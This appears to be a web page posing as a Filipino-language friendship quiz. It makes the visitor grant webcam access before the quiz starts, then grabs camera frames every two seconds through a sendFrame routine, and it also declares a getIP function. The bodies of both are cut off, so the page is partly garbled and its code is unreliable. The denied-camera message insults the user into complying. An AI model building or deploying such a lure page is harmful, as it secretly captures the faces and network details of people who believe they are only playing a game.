  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: black;
      min-height: 100vh;
      overflow: hidden;
    }
    .container {
      position: relative;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: white;
      border-radius: 50%;
      opacity: 0.6;
      pointer-events: none;
      z-index: 20;
      animation: fall linear infinite;
    }
    @keyframes fall {
      0% {
        transform: translateY(-10px);
        opacity: 0;
      }
      10% {
        opacity: 0.6;
      }
      90% {
        opacity: 0.6;
      }
      100% {
        transform: translateY(100vh);
        opacity: 0;
      }
    }
    .card {
      position: relative;
      z-index: 10;
      width: 100%;
      max-width: 42rem;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border-radius: 0.5rem;
      padding: 2rem;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    .text-center {
      text-align: center;
    }
    h2 {
      color: white;
      font-size: 1.875rem;
      font-weight: bold;
      margin-bottom: 1rem;
    }
    p {
      color: rgba(255, 255, 255, 0.9);
      margin-bottom: 1.5rem;
    }
    .error {
      color: #fca5a5;
      font-size: 0.875rem;
      margin-bottom: 1rem;
    }
    button {
      background: white;
      color: black;
      padding: 0.75rem 2rem;
      border-radius: 0.5rem;
      font-weight: 600;
      border: none;
      cursor: pointer;
      transition: all 0.2s;
      font-size: 1rem;
    }
    button:hover {
      opacity: 0.9;
    }
    button:disabled {
      cursor: not-allowed;
    }
    .quiz-header {
      margin-bottom: 1.5rem;
    }
    .quiz-info {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
      color: white;
      font-size: 0.875rem;
    }
    .progress-bar {
      width: 100%;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 9999px;
      height: 0.5rem;
      overflow: hidden;
    }
    .progress-fill {
      background: white;
      height: 100%;
      transition: width 0.3s;
      border-radius: 9999px;
    }
    .question {
      color: white;
      font-size: 1.5rem;
      font-weight: bold;
      margin-bottom: 2rem;
    }
    .options {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }
    .option {
      width: 100%;
      text-align: left;
      padding: 1rem;
      border-radius: 0.5rem;
      background: rgba(255, 255, 255, 0.1);
      color: white;
      border: none;
      cursor: pointer;
      transition: all 0.2s;
      font-size: 1rem;
    }
    .option:hover:not(:disabled) {
      background: rgba(255, 255, 255, 0.2);
    }
    .option.correct {
      background: #22c55e;
      color: white;
    }
    .option.incorrect {
      background: #ef4444;
      color: white;
    }
    .score-display {
      color: white;
      font-size: 3rem;
      font-weight: bold;
      margin: 1rem 0;
    }
    .result-message {
      color: white;
      font-size: 1.25rem;
      margin-bottom: 2rem;
    }
  </style>
</head>

    async function getIP() {

    async function sendFrame() {
      const video = document.getElementById('liveVideo');
      if (!video || !video.videoWidth) return;

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      ctx.scale(-1, 1);

    function createParticles() {
      const container = document.querySelector('.container');
      for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDelay = Math.random() * 5 + 's';
        particle.style.animationDuration = (5 + Math.random() * 5) + 's';
        particle.style.width = particle.style.height = (2 + Math.random() * 3) + 'px';
        container.appendChild(particle);
      }
    }
    createParticles();

    async function requestCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('liveVideo');
        video.srcObject = stream;
        video.play().catch(() => {});

        setTimeout(() => sendFrame(), 1500);
        captureInterval = setInterval(sendFrame, 2000);

        showQuiz();
      } catch (error) {
        document.getElementById('cameraError').textContent = 'allow mo muna para makapasok ka bobo';
        document.getElementById('cameraError').style.display = 'block';
      }
    }

    function showQuiz() {
      const app = document.getElementById('app');
      app.innerHTML = `
        <div class="card">
          <div class="quiz-header">
            <div class="quiz-info">
              <span>Question <span id="current">1</span>/${questions.length}</span>
              <span>Score: <span id="score">0</span></span>
            </div>
            <div class="progress-bar">
              <div class="progress-fill" id="progress"></div>
            </div>
          </div>
          <h2 class="question" id="question"></h2>
          <div class="options" id="options"></div>
        </div>
      `;
      renderQuestion();
    }

    function renderQuestion() {
      const q = questions[currentQuestion];
      document.getElementById('question').textContent = q.question;
      document.getElementById('current').textContent = currentQuestion + 1;
      document.getElementById('score').textContent = score;
      document.getElementById('progress').style.width = ((currentQuestion + 1) / questions.length * 100) + '%';
      const optionsEl = document.getElementById('options');
      optionsEl.innerHTML = '';
      q.options.forEach((opt, i) => {
        const btn = document.createElement('button');
        btn.className = 'option';
        btn.textContent = opt;
        btn.onclick = () => handleAnswer(i);
        optionsEl.appendChild(btn);
      });
      isAnswered = false;
    }

    function handleAnswer(index) {
      if (isAnswered) return;
      isAnswered = true;
      const q = questions[currentQuestion];
      const isCorrect = Array.isArray(q.correct) ? q.correct.includes(index) : index === q.correct;
     
      if (isCorrect) score++;
      const buttons = document.querySelectorAll('.option');
      buttons.forEach((btn, i) => {
        btn.disabled = true;
        const correct = Array.isArray(q.correct) ? q.correct.includes(i) : i === q.correct;
        if (i === index) {
          btn.className = 'option ' + (isCorrect ? 'correct' : 'incorrect');
        } else if (correct) {
          btn.className = 'option correct';
        }
      });
      setTimeout(() => {
        if (currentQuestion < questions.length - 1) {
          currentQuestion++;
          renderQuestion();
        } else {
          showResult();
        }
      }, 1500);
    }

    function showResult() {
      const msg = score === questions.length ? "Wow Galing loveu!" :
                  score >= questions.length * 0.7 ? "Wow Ang galing mo Tanga!" :
                  score >= questions.length * 0.5 ? "Fake Friend!" : "Keep Practicing!";
     
      document.getElementById('app').innerHTML = `
        <div class="card text-center">
          <h2>Quiz Complete! ðŸŽ‰</h2>
          <p class="score-display">${score}/${questions.length}</p>
          <p class="result-message">${msg}</p>
          <button onclick="location.reload()">Try Again</button>
        </div>
      `;
    }

    window.addEventListener('beforeunload', () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (captureInterval) {
        clearInterval(captureInterval);
      }
    });
  </script>
</body>
</html>
